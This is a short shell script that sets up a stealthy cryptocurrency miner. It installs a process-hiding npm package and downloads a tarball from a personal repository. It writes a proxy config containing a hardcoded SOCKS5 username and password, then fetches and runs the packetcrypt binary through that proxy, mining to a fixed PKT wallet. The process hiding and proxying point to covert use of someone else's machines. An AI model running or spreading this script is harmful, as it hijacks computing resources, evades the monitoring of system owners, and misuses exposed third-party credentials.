apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
  
npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = us-east-static-09.quotaguard.com:1080
socks5_username = 7amdbgj23nyn0e
socks5_password = khisr9gjnuxw049kbtldkaqtrcor
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
chmod +x lah

./graftcp/graftcp ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pktpool.io/ 
